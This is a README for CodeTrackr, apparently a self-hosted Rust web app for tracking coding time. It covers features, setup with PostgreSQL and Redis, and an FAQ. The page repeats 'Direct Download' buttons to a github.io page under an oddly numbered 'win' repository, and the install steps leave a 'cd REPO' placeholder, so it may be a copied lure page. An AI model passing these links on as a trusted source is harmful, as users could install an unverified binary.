# CodeTrackr - Developer Productivity Analytics 2026

> **CodeTrackr is a self-hosted web application for tracking coding time and developer activity across projects, languages, and editors, with a live dashboard and extensible analytics features.**

[![Platform](https://img.shields.io/badge/Platform-Self--hosted%20web%20application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/coopercarter4/codetrackr-win-15241?style=flat-square)](https://github.com/coopercarter4/codetrackr-win-15241)

---

<p align="center">
  <a href="https://coopercarter4.github.io/codetrackr-win-15241/">
    <img src="https://img.shields.io/badge/Download-CodeTrackr%20Latest-brightgreen?style=for-the-badge" alt="Download CodeTrackr">
  </a>
</p>

> **[Direct Download - CodeTrackr Latest](https://coopercarter4.github.io/codetrackr-win-15241/)**

---

[Download Latest Build](https://coopercarter4.github.io/codetrackr-win-15241/)

---

## About CodeTrackr

CodeTrackr brings coding time tracking, programming statistics, and developer analytics into a self-hosted web application. It records activity by project, programming language, and editor, then presents the results through a real-time dashboard designed for individual developers and teams.

The application combines IDE integrations with a plugin system, customizable dashboard presentation, and optional community features such as weekly global leaderboards. Its Rust and Axum backend works with PostgreSQL and Redis, while JavaScript dashboard plugins and a QuickJS sandbox provide additional ways to extend the platform.

---

## Features

- Track programming time by project, language, and editor
- Monitor activity through a live dashboard with WebSocket updates
- Review weekly global developer leaderboards
- Connect supported IDE extensions
- Extend dashboard behavior with JavaScript plugins
- Browse and manage additions through the Plugin Store
- Run server-side plugins inside a QuickJS sandbox
- Customize the interface with CSS themes
- Authenticate with GitHub, GitLab, or anonymous access
- Export collected data for external analysis
- Support optional Stripe integration for Pro Cloud deployments

---

## Installation

Clone the repository and enter the project directory:

```bash
git clone https://github.com/coopercarter4/codetrackr-win-15241.git
cd REPO
```

CodeTrackr is built with Rust and uses PostgreSQL and Redis as supporting services. Prepare those services for the deployment, review the available configuration options, and start the application using the project's Rust workflow:

```bash
cargo run --release
```

For production use, compile the release build and place it behind the web server or hosting setup used by your environment.

---

## Usage

A typical CodeTrackr workflow is:

1. Start PostgreSQL and Redis.
2. Configure the application connection details for those services.
3. Launch the CodeTrackr web application.
4. Connect an IDE extension to begin sending coding activity.
5. Open the dashboard to review time by project, language, and editor.
6. Export activity data when you need an external copy.
7. Add dashboard plugins or themes as your workflow develops.

After installation, open the application URL configured for your deployment and complete the selected authentication flow.

---

## Configuration

CodeTrackr's operational settings should be supplied through the deployment environment and the configuration process provided by the application. At minimum, plan configuration for:

```text
Application URL
PostgreSQL connection
Redis connection
Authentication providers
IDE extension connections
Optional Stripe settings
```

Dashboard plugins, CSS themes, and other presentation changes can be managed through the application's plugin and customization features. Keep service credentials and provider keys outside source control.

---

## Requirements

- A self-hosted web application environment
- Rust toolchain for building or running from source
- PostgreSQL
- Redis
- A supported web browser
- IDE extensions for editor-based activity collection
- Network access between the application, database, cache, and connected clients

The project uses Rust with Axum for its web layer. PostgreSQL stores application data, while Redis supports application runtime needs.

---

## FAQ

### Who is CodeTrackr for?

CodeTrackr is intended for developers, teams, and organizations that want coding-time records and programming statistics in a self-hosted environment.

### Does it support multiple editors?

IDE extension integrations are available for connecting editor activity to CodeTrackr. The exact extension setup depends on the editor being used.

### Where are settings managed?

Core deployment settings belong in the application environment and service configuration. Dashboard plugins and visual customization are handled through CodeTrackr's extension and theme features.

### Can I export my data?

Yes. CodeTrackr includes data export functionality for taking activity information outside the application.

### How do updates work?

Pull the latest project changes, review any configuration or database notes, rebuild the Rust application, and restart the deployment. Keep a backup of important data before applying changes.

### What should I check if activity is missing?

Confirm that the relevant IDE extension is connected, the application can reach PostgreSQL and Redis, authentication is configured correctly, and the client is using the correct CodeTrackr instance.

### Is authentication required?

CodeTrackr supports GitHub, GitLab, and anonymous authentication. The appropriate option depends on how the instance is configured.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
